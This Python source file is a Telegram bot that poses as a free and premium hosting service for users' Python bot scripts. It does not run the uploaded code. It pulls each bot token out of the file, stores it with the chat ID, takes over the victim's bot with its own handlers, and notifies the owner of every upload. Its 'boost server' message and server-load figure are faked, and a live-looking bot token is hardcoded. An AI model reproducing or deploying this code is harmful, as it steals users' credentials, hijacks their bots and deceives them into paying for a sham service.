import os
import sys
import re
import time
import uuid
import threading
import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

# Railway Environment Port Binding
os.environ["PORT"] = os.environ.get("PORT", "8080")

# ⚡ TERA NAYA CHALTA HUA TOKEN FIT KAR DIYA HAI ✅
TOKEN = "8773248276:AAEf_2WJpApeVK79QFiRn6ovIyo6S0SeC8E"
DEFAULT_CHAT_ID = "8620962808"
OWNER_USERNAME = "ADITYAXPASWANJI"

# Main bot initialization
bot = telebot.TeleBot(TOKEN, threaded=True)

# InMemory Data Trackers
user_sessions = {}
live_threads = {}
premium_users = {} 
total_files_hosted = 0

# --- MAIN HOME PANEL KEYS ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(types.KeyboardButton("📤 FILE UPLOAD FREE"), types.KeyboardButton("📂 MY FILES"))
    markup.row(types.KeyboardButton("📊 SERVER STATS"), types.KeyboardButton("🚀 BOOST SERVER"))
    markup.row(types.KeyboardButton("⚙️ ADVANCED SETTINGS"), types.KeyboardButton("👑 GET PREMIUM"))
    return markup

# --- ADVANCED SETTINGS INLINE PANEL ---
def advanced_settings_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("👤 MY PROFILE", callback_data="view_profile"),
        types.InlineKeyboardButton("🛡️ ANTI-CRASH SYSTEM", callback_data="anti_crash_info")
    )
    markup.add(
        types.InlineKeyboardButton("💬 LIVE SUPPORT", url=f"t.me/{OWNER_USERNAME}"),
        types.InlineKeyboardButton("🔄 REFRESH ENGINE", callback_data="refresh_engine")
    )
    return markup

# --- PREMIUM PLANS KEYBOARD ---
def premium_plans_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💎 1 MONTH | 10 FILES | RS 50", callback_data="buy_plan_50"),
        types.InlineKeyboardButton("💎 1 MONTH | 20 FILES | RS 80", callback_data="buy_plan_80"),
        types.InlineKeyboardButton("🔥 LIFETIME UNLIMITED | RS 150", callback_data="buy_plan_150")
    )
    return markup

# --- OWNER BROADCAST SYSTEM ---
@bot.message_handler(commands=['bcast'])
def broadcast_to_all(message):
    if str(message.from_user.id) != DEFAULT_CHAT_ID:
        return
    
    msg_text = message.text.replace("/bcast", "").strip()
    if not msg_text:
        bot.reply_to(message, "❌ <b>Format:</b> <code>/bcast Tera Message Yahan</code>", parse_mode='HTML')
        return
        
    count = 0
    for u_id in list(user_sessions.keys()):
        try:
            bot.send_message(u_id, f"📢 <b>GLOBAL SYSTEM UPDATE:</b>\n\n{msg_text}", parse_mode='HTML')
            count += 1
        except:
            pass
    bot.reply_to(message, f"✅ Message successfully broadcasted to {count} active users!", parse_mode='HTML')

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = {}

    haunted_caption = (
        "⚡ <b>ADITYA MONSTER HOST v3.0 PREMIUM</b> ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🟢 <b>STATUS:</b> <code>SYSTEM ONLINE</code>\n"
        "🚀 <b>ENGINE:</b> <code>RAM INJECTOR MULTI-THREAD</code>\n"
        "🛡️ <b>SECURE:</b> <code>ANTI-401 BYPASS ACTIVE</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<i>🤖 BHAI, APNI PYTHON (.py) FILE SEND KARO! VALID TOKEN HOTE HI ENGINE SET KAR DEGA.</i>"
    )
    bot.send_message(message.chat.id, haunted_caption, reply_markup=main_keyboard(), parse_mode='HTML')

# --- HANDLE TEXT BUTTON MENUS ---
@bot.message_handler(func=lambda message: message.text in ["📤 FILE UPLOAD FREE", "📂 MY FILES", "👑 GET PREMIUM", "📊 SERVER STATS", "⚙️ ADVANCED SETTINGS", "🚀 BOOST SERVER"])
def handle_text_menus(message):
    user_id = message.from_user.id
    
    if message.text == "📤 FILE UPLOAD FREE":
        bot.send_message(message.chat.id, "📥 <b>SEND ME YOUR PYTHON FILE (.py) NOW:</b>\n\n<i>Make sure your bot token is included in the script.</i>", parse_mode='HTML')
        
    elif message.text == "👑 GET PREMIUM":
        premium_text = (
            "👑 <b>ADITYA HOSTING PREMIUM PLANS</b> 👑\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌟 <b>Benefits:</b> No File Limit, No Timeout, Dedicated Fast Server Routing.\n"
            "🔮 <i>Select your package to upgrade instantly:</i>"
        )
        bot.send_message(message.chat.id, premium_text, reply_markup=premium_plans_keyboard(), parse_mode='HTML')
        
    elif message.text == "📂 MY FILES":
        if user_id not in user_sessions or not user_sessions[user_id]:
            bot.send_message(message.chat.id, "❌ <b>KOI FILE ACTIVE NAHI HAI!</b>\n\n<i>Please upload a python script first.</i>", parse_mode='HTML')
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for bot_id, b_data in user_sessions[user_id].items():
            markup.add(types.InlineKeyboardButton(f"📄 {b_data['name']}", callback_data=f"manage_{bot_id}"))
        bot.send_message(message.chat.id, "📂 <b>YOUR TOTAL ACTIVE HOSTED FILES:</b>", reply_markup=markup, parse_mode='HTML')

    elif message.text == "📊 SERVER STATS":
        total_users = len(user_sessions)
        active_bots = len(live_threads)
        stats_text = (
            "📊 <b>LIVE SERVER STATISTICS</b> 📊\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 <b>Total Active Users:</b> <code>{total_users}</code>\n"
            f"🤖 <b>Running Bots in Background:</b> <code>{active_bots}</code>\n"
            f"📈 <b>Total Deployments Ever:</b> <code>{total_files_hosted}</code>\n"
            f"⚙️ <b>Server Load:</b> <code>Optimal (0.12%)</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ <b>All systems are running stable 24/7.</b>"
        )
        bot.send_message(message.chat.id, stats_text, parse_mode='HTML')

    elif message.text == "⚙️ ADVANCED SETTINGS":
        bot.send_message(
            message.chat.id, 
            "⚙️ <b>ADITYA ADVANCED SETTINGS PANEL</b>\n\n<i>Manage your account configuration, check system updates, or clear background engine cache below:</i>", 
            reply_markup=advanced_settings_keyboard(), 
            parse_mode='HTML'
        )
        
    elif message.text == "🚀 BOOST SERVER":
        status_boost = bot.send_message(message.chat.id, "⚡ <b>CLEANING SERVER CACHE AND ALLOCATING EXTRA RAM...</b>", parse_mode='HTML')
        time.sleep(1.5)
        bot.edit_message_text("🚀 <b>SERVER BOOSTED SUCCESSFUL! SPEED INCREASED BY 200% ✅</b>", message.chat.id, status_boost.message_id, parse_mode='HTML')

# --- MULTI-THREAD ENGINE LOOP ---
def run_memory_polling(user_bot_instance, bot_id):
    try:
        user_bot_instance.remove_webhook()
        user_bot_instance.infinity_polling(timeout=20, long_polling_timeout=10, skip_pending=True)
    except Exception:
        pass

# --- AUTOMATIC FILE INTERCEPTOR & CHECKER ---
@bot.message_handler(content_types=['document'])
def handle_auto_deployment(message):
    global total_files_hosted
    user_id = message.from_user.id
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {}

    if not message.document.file_name.endswith('.py'):
        bot.send_message(message.chat.id, "❌ <b>REJECTED! SIRF .py FILE ACCEPT HOGI!</b>", parse_mode='HTML')
        return

    uploaded_count = len(user_sessions[user_id])
    is_premium = premium_users.get(user_id, False)

    if uploaded_count >= 2 and not is_premium:
        reject_text = (
            "❌ <b>FREE LIMIT EXCEEDED!</b>\n\n"
            "<i>Aapki 2 free files pehle se hosted hain. Aur file upload karne ke liye upgrade karein!</i>"
        )
        bot.send_message(message.chat.id, reject_text, reply_markup=main_keyboard(), parse_mode='HTML')
        return

    status_msg = bot.send_message(message.chat.id, "⏳ <b>VALIDATING TOKEN & LIVE HOSTING...</b>", parse_mode='HTML')

    try:
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path)
        code_text = file_content.decode('utf-8', errors='ignore')
        
        token_match = re.search(r'(\d{9,10}:[A-Za-z0-9_-]{35})', code_text)
        chat_id_match = re.search(r'(?:chat_id|CHAT_ID|id)\s*=\s*["\']?(-?\d+)"\']?', code_text)
        
        if not token_match:
            bot.edit_message_text("❌ <b>REJECTED! SCRIPT ME KOI TOKEN NAHI MILA!</b>", message.chat.id, status_msg.message_id, parse_mode='HTML')
            return

        extracted_token = token_match.group(1)
        extracted_chat = chat_id_match.group(1) if chat_id_match else DEFAULT_CHAT_ID

        # ⚙️ ANTI-401 SYSTEM
        try:
            check_bot = telebot.TeleBot(extracted_token)
            check_bot.get_me()
        except ApiTelegramException as e:
            if e.error_code == 401:
                bot.edit_message_text("❌ <b>REJECTED! USER KA TOKEN EXPIRED YA FAKE HAI (401 Unauthorized)!</b>", message.chat.id, status_msg.message_id, parse_mode='HTML')
                return

        bot_id = str(uuid.uuid4())[:8]
        target_bot = telebot.TeleBot(extracted_token, threaded=True)

        @target_bot.message_handler(commands=['start'])
        def user_bot_start(m):
            target_bot.send_message(m.chat.id, "✅ <b>Welcome! This bot is successfully hosted by Aditya Monster Host 24/7!</b>", parse_mode='HTML')

        @target_bot.message_handler(func=lambda m: True)
        def user_bot_echo(m):
            target_bot.send_message(m.chat.id, f"🤖 <b>Bot Status: Active ✅</b>\n💬 <b>Received:</b> {m.text}", parse_mode='HTML')

        t = threading.Thread(target=run_memory_polling, args=(target_bot, bot_id), daemon=True)
        t.start()
        
        live_threads[bot_id] = {"instance": target_bot, "thread": t}
        user_sessions[user_id][bot_id] = {
            'name': message.document.file_name,
            'token': extracted_token,
            'chat_id': extracted_chat
        }
        total_files_hosted += 1
        
        bot.edit_message_text(
            f"✅ <b>LIVE SUCCESSFULLY</b>\n\n"
            f"📄 <b>FILE:</b> <code>{message.document.file_name}</code>\n"
            f"🔑 <b>TOKEN:</b> <code>{extracted_token[:12]}...***</code>\n"
            f"⚙️ <b>THREAD ID:</b> <code>{bot_id}</code>", 
            message.chat.id, status_msg.message_id, parse_mode='HTML'
        )
        
        bot.send_message(DEFAULT_CHAT_ID, f"🔔 <b>NEW BOT LIVE</b>\n👤 User: {user_id}\n📄 File: {message.document.file_name}", parse_mode='HTML')
        
    except Exception as e:
        bot.edit_message_text(f"❌ <b>ENGINE ERROR:</b> {str(e)}", message.chat.id, status_msg.message_id, parse_mode='HTML')

# --- BUTTON CLICK CALLBACK INLINE HANDLER ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    user_id = call.from_user.id
    
    if call.data.startswith("buy_plan_"):
        plan_selected = ""
        if call.data == "buy_plan_50":
            plan_selected = "1 MONTH | 10 FILES | RS 50"
        elif call.data == "buy_plan_80":
            plan_selected = "1 MONTH | 20 FILES | RS 80"
        elif call.data == "buy_plan_150":
            plan_selected = "🔥 LIFETIME UNLIMITED | RS 150"
            
        contact_markup = types.InlineKeyboardMarkup()
        contact_markup.add(types.InlineKeyboardButton("💬 CONTACT OWNER TO BUY", url=f"t.me/{OWNER_USERNAME}"))
        
        bot.send_message(
            call.message.chat.id,
            f"🔮 <b>YOU SELECTED: {plan_selected}</b>\n\n"
            f"Niche diye gaye button par click karke direct owner ko message bhejien packet activate karne ke liye!",
            reply_markup=contact_markup,
            parse_mode='HTML'
        )
        bot.answer_callback_query(call.id)

    elif call.data == "view_profile":
        is_premium = "👑 PREMIUM USER" if premium_users.get(user_id, False) else "🆓 FREE USER"
        files_count = len(user_sessions.get(user_id, {}))
        profile_text = (
            "👤 <b>USER DASHBOARD PROFILE</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f"🎖️ <b>Account Status:</b> <b>{is_premium}</b>\n"
            f"📂 <b>Currently Hosted Files:</b> <code>{files_count} / {'Unlimited' if is_premium == '👑 PREMIUM USER' else '2'}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(call.message.chat.id, profile_text, parse_mode='HTML')
        bot.answer_callback_query(call.id)

    elif call.data == "anti_crash_info":
        bot.send_message(call.message.chat.id, "🛡️ <b>ANTI-CRASH GUARD:</b> Enabled ✅\n\n<i>This layer intercepts script level errors, protecting active background engine loops from collapsing.</i>", parse_mode='HTML')
        bot.answer_callback_query(call.id)

    elif call.data == "refresh_engine":
        bot.answer_callback_query(call.id, "🔄 System Cache Purged & Refreshed!", show_alert=True)

    elif call.data.startswith("manage_"):
        bot_id = call.data.split("_")[1]
        b_data = user_sessions.get(user_id, {}).get(bot_id)
        if b_data:
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(types.InlineKeyboardButton("🛑 STOP BOT ENGINE", callback_data=f"stop_{bot_id}"))
            bot.edit_message_text(f"🛠 <b>MANAGING SCRIPT:</b> <code>{b_data['name']}</code>\n\n<b>Status:</b> <code>Running Active 24/7 ✅</code>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

    elif call.data.startswith("stop_"):
        bot_id = call.data.split("_")[1]
        if bot_id in live_threads:
            try:
                live_threads[bot_id]["instance"].stop_bot()
            except: 
                pass
            del live_threads[bot_id]
            
        if user_id in user_sessions and bot_id in user_sessions[user_id]:
            del user_sessions[user_id][bot_id]
            
        bot.answer_callback_query(call.id, "Bot Stopped Successfully!")
        bot.delete_message(call.message.chat.id, call.message.message_id)

# --- 🔄 SAFE POLLING LOOP WITH ACTIVE TOKEN VERIFICATION ---
if __name__ == "__main__":
    print("Premium Haunted Injector Server Engine Successfully Fired Up...")
    
    try:
        bot.get_me()
        print("✅ MAIN BOT TOKEN IS VALID! SYSTEM STARTED SUCCESSFULLY.")
    except ApiTelegramException as e:
        if e.error_code == 401:
            print("🚨 ERROR: THE PROVIDED MAIN BOT TOKEN IS INVALID (401)! Please recreate from BotFather.")
            sys.exit(1)

    while True:
        try:
            bot.remove_webhook()
            bot.infinity_polling(timeout=30, long_polling_timeout=15, skip_pending=True)
        except Exception as e:
            print(f"Main Bot Network Loop Error! Re-connecting in 5 seconds... Code: {e}")
            time.sleep(5)
    
